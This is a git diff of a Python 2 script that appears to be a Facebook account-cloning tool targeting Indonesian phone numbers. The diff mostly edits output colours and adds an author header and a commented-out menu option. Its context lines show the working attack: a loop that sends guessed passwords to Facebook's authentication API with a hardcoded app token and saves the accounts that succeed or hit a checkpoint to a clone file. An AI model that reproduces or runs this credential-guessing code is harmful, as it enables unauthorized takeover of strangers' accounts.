@@ -1,3 +1,10 @@
+# ! ( WAJIB DI BACA )
+# * Author : Angga Kurniawan
+# * Kalo Mau Nge Recode Izin Lah, Bangsatkau
+# * Hargai Pembuatnya Bro Oke
+
+
+
 #!/usr/bin/python2
 #coding=utf-8
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
@@ -130,7 +137,7 @@ def menu():
 	action()
 
 def action():
-    peak = raw_input('\n\033[1;97mChoose an Option:\033[1;97m')
+    peak = raw_input('\n\033[1;97mChoose an Option : \033[1;97m')
     if peak =='':
         print '[!] Fill In Correctly'
         action()
@@ -179,6 +186,21 @@ def action():
             print ("[!] File Not Found")
             raw_input("\n[ Back ]")
             menu()
+##    elif peak =="4":              
+##        os.system("clear")
+##        print logo
+##        print("\033[1;97mArea Codes With Network")+'\n'
+##        print("\033[1;97m817, 818, 819, 21, 22, 24, 61, 31")+'\n'
+##        try:
+##            c = raw_input("\033[1;97mChoose Area Code : ")
+##            k="+62"
+##            idlist = ('.txt')
+##            for line in open(idlist,"r").readlines():
+##                id.append(line.strip())
+##        except IOError:
+##            print ("[!] File Not Found")
+##            raw_input("\n[ Back ]")
+##            menu()
     elif peak =='0':
         menu()
     else:
@@ -202,14 +224,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;97m[Successfully]  ' + k + c + user + '  |  ' + pass1
+				print '[\033[1;93mSuccessfully\033[1;92m]' + k + c + user + '  |  ' + pass1
 				okb = open('anggaxd/clone.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass1
+					print '[\033[1;93mCheckpoint\033[1;97m]' + k + c + user + '  |  ' + pass1
 					cps = open('anggaxd/clone.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -219,20 +241,19 @@ def action():
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
- 				        print '\x1b[1;97m[Successfully]  ' + k + c + user +  '  |  ' + pass2
+ 				        print '[\033[1;93mSuccessfully\033[1;92m]' + k + c + user +  '  |  ' + pass2
  				        okb = open('anggaxd/clone.txt', 'a')
  				        okb.write(k+c+user+'|'+pass2+'\n')
  				        okb.close()
  				        oks.append(c+user+pass2)
  				    else:
  				        if 'www.facebook.com' in q['error_msg']:
- 					        print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass2
+ 					        print '[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + '  |  ' + pass2
  					        cps = open('anggaxd/clone.txt', 'a')
  					        cps.write(k+c+user+'|'+pass2+'\n')
  					        cps.close()
  					        cpb.append(c+user+pass2)
-
-                    
+              
         except:
             pass
         
@@ -242,9 +263,8 @@ def action():
     print '[✓] Process Has Been Completed ...'
     print '[✓] Total Successfully/Checkpoint : '+str(len(oks))+'/'+str(len(cpb))
     print('[✓] Cloned Accounts Has Been Saved : anggaxd/clone.txt')
-    print("Notice : Checkpoint Accounts Will Open Between 7-15 Days")
     
-    raw_input("\n\033[1;97m[\033[1;97mBack\033[1;95m]")
+    raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
     menu() 
           
 if __name__ == '__main__':
